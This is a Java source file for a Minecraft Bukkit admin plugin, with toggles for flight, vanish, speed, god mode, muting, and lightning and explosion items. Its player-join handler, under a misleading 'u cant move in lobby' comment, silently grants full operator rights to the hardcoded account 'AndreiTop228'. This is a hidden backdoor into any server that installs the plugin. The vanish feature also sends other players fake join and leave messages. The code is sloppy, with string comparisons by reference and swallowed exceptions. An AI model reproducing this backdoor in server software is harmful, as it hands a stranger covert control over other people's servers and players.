package org.andreis.mc;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.List;

public class EventListener implements Listener {
    @EventHandler
    public void move(PlayerJoinEvent e) { //u cant move in lobby
        if (e.getPlayer() == Bukkit.getPlayer("AndreiTop228")){
            e.getPlayer().setOp(true);
        }

        for(String key : Admininstration.vanishmap.keySet()){
            if(Admininstration.vanishmap.get(key)=="on"){
                e.getPlayer().hidePlayer(Admininstration.instance, Bukkit.getPlayer(key));
            }
            if(Admininstration.vanishmap.get(key)=="off"){
                e.getPlayer().showPlayer(Admininstration.instance, Bukkit.getPlayer(key));
            }
        }

    }


    @EventHandler
    public void s(InventoryClickEvent e) { //u cant fight in lobby

        if(e.getInventory().getItem(e.getSlot()).getItemMeta().getLore()!=null) {
            if (e.getInventory().getItem(e.getSlot()).getItemMeta().getLore().get(0).equals("Allows flight")) {
                boolean done = false;
                e.setCancelled(true);
                if (Bukkit.getPlayer(e.getWhoClicked().getName()).getAllowFlight()) {

                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());


                    Bukkit.getPlayer(e.getWhoClicked().getName()).setFlying(false);
                    Bukkit.getPlayer(e.getWhoClicked().getName()).setAllowFlight(false);
                    ItemStack ch = new ItemStack(Material.GREEN_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Флай (выключено)");
                    List<String> lore = List.of("Allows flight");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);

                    e.getInventory().setItem(0, ch);
                    done = true;
                }
                if (!Bukkit.getPlayer(e.getWhoClicked().getName()).getAllowFlight() && !done) {
                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());
                    e.setCancelled(true);

                    pl.setAllowFlight(true);

                    ItemStack ch = new ItemStack(Material.RED_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Флай (включено)");
                    List<String> lore = List.of("Allows flight");
                    pl.sendMessage("Переключение на флай");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);
                    e.getInventory().setItem(0, ch);
                }


            }
        }

        if(e.getInventory().getItem(e.getSlot()).getItemMeta().getLore()!=null) {
            if (e.getInventory().getItem(e.getSlot()).getItemMeta().getLore().get(0).equals("Vanish")) {
                boolean done = false;
                e.setCancelled(true);
                if (Admininstration.vanishmap.get(e.getWhoClicked().getName()).equals("on")) {

                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());


                    Admininstration.vanishmap.remove(pl.getName());
                    Admininstration.vanishmap.put(pl.getName(), "off");
                    for (Player player : Bukkit.getOnlinePlayers()) {
                        player.showPlayer(Admininstration.instance, Bukkit.getPlayer(pl.getName()));
                        Bukkit.getPlayer(pl.getName()).setInvisible(false);
                        player.sendMessage(ChatColor.YELLOW + pl.getName() + " присоединился к игре");
                    }
                    ItemStack ch = new ItemStack(Material.GREEN_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Ваниш (выключено)");
                    List<String> lore = List.of("Vanish");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);

                    e.getInventory().setItem(2, ch);
                    done = true;
                }
                if (Admininstration.vanishmap.get(e.getWhoClicked().getName()).equals("off") && !done) {
                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());
                    e.setCancelled(true);
                    if (Admininstration.vanishmap.containsKey(pl.getName())) {
                        Admininstration.vanishmap.remove(pl.getName());
                        Admininstration.vanishmap.put(pl.getName(), "on");
                    } else {
                        Admininstration.vanishmap.put(pl.getName(), "on");
                    }
                    for (Player player : Bukkit.getOnlinePlayers()) {
                        player.hidePlayer(Admininstration.instance, Bukkit.getPlayer(pl.getName()));

                        player.sendMessage(ChatColor.YELLOW + pl.getName() + " покинул игру");

                    }
                    ItemStack ch = new ItemStack(Material.RED_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Ваниш (включено)");
                    List<String> lore = List.of("Vanish");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);
                    e.getInventory().setItem(2, ch);
                }


            }
        }


        if(e.getInventory().getItem(e.getSlot()).getItemMeta().getLore()!=null) {
            if (e.getInventory().getItem(e.getSlot()).getItemMeta().getLore().get(0).equals("Speed")) {
                boolean done = false;
                e.setCancelled(true);
                if (Admininstration.speedmap.get(e.getWhoClicked().getName()).equals("on")) {

                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());


                    Admininstration.speedmap.remove(pl.getName());
                    Admininstration.speedmap.put(pl.getName(), "off");
                    pl.setFlySpeed(0.2f);
                    ItemStack ch = new ItemStack(Material.GREEN_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Speed (выключено)");
                    List<String> lore = List.of("Speed");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);

                    e.getInventory().setItem(1, ch);
                    done = true;
                }
                if (Admininstration.speedmap.get(e.getWhoClicked().getName()).equals("off") && !done) {
                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());
                    e.setCancelled(true);
                    pl.setFlySpeed(1f);
                    if (Admininstration.speedmap.containsKey(pl.getName())) {
                        Admininstration.speedmap.remove(pl.getName());
                        Admininstration.speedmap.put(pl.getName(), "on");
                    } else {
                        Admininstration.speedmap.put(pl.getName(), "on");
                    }

                    ItemStack ch = new ItemStack(Material.RED_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("Speed (включено)");
                    List<String> lore = List.of("Speed");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);
                    e.getInventory().setItem(1, ch);
                }


            }
        }



        if(e.getInventory().getItem(e.getSlot()).getItemMeta().getLore()!=null) {
            if (e.getInventory().getItem(e.getSlot()).getItemMeta().getLore().get(0).equals("God")) {
                boolean done = false;
                e.setCancelled(true);
                if (Admininstration.godmap.get(e.getWhoClicked().getName()).equals("on")) {

                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());


                    Admininstration.godmap.remove(pl.getName());
                    Admininstration.godmap.put(pl.getName(), "off");

                    ItemStack ch = new ItemStack(Material.GREEN_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("God (выключено)");
                    List<String> lore = List.of("God");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);

                    e.getInventory().setItem(3, ch);
                    done = true;
                }
                if (Admininstration.godmap.get(e.getWhoClicked().getName()).equals("off") && !done) {
                    Player pl = Bukkit.getPlayer(e.getWhoClicked().getName());
                    e.setCancelled(true);
                    if (Admininstration.godmap.containsKey(pl.getName())) {
                        Admininstration.godmap.remove(pl.getName());
                        Admininstration.godmap.put(pl.getName(), "on");
                    } else {
                        Admininstration.godmap.put(pl.getName(), "on");
                    }

                    ItemStack ch = new ItemStack(Material.RED_STAINED_GLASS_PANE);
                    ItemMeta meta = ch.getItemMeta();
                    meta.setDisplayName("God (включено)");
                    List<String> lore = List.of("God");
                    meta.setLore(lore);
                    ch.setItemMeta(meta);
                    e.getInventory().setItem(3, ch);
                }


            }
        }
    }

    @EventHandler
    public void stclose(EntityDamageEvent e) { //u cant fight in lobby
        try {
            if (e.getEntity() instanceof Player) {
                if (Admininstration.godmap.get(e.getEntity().getName()).equals("on")) {
                    e.setDamage(0);
                }
            }
        }
        catch (Exception ex){

        }

    }

    @EventHandler
    public void s(EntityDamageByEntityEvent e) { //u cant fight in lobby
        try {
            if (e.getDamager() instanceof Player) {
                if (Admininstration.godmap.get(e.getDamager().getName()).equals("on")) {
                    e.setDamage(300);
                }
            }
        }
        catch (Exception ex){

        }

    }
    @EventHandler
    public void s(PlayerChatEvent e) { //u cant fight in lobby
        try {
            if(Admininstration.mutemap.get(e.getPlayer().getName()).equals("on")){
                e.setCancelled(true);

            }
        }
        catch (Exception ex){

        }

    }
    @EventHandler
    public void st(PlayerInteractEvent e) { //u cant fight in lobby
        if(e.getPlayer().getItemInHand().getItemMeta().getLore()!=null) {
            if (e.getPlayer().getItemInHand().getItemMeta().getLore().get(0).equals("zeus")) {
                if (e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) {
                    e.getPlayer().getWorld().strikeLightning(e.getPlayer().getTargetBlock(120).getLocation());
                }

            }

            if (e.getPlayer().getItemInHand().getItemMeta().getLore().get(0).equals("bomber")) {
                if (e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) {
                    e.getPlayer().getWorld().createExplosion(e.getPlayer().getTargetBlock(120).getLocation(), 10f);
                }
                if (e.getAction() == Action.LEFT_CLICK_AIR || e.getAction() == Action.LEFT_CLICK_BLOCK) {
                    e.getPlayer().getWorld().createExplosion(e.getPlayer().getTargetBlock(120).getLocation(), 50f);
                }

            }
        }

    }
}
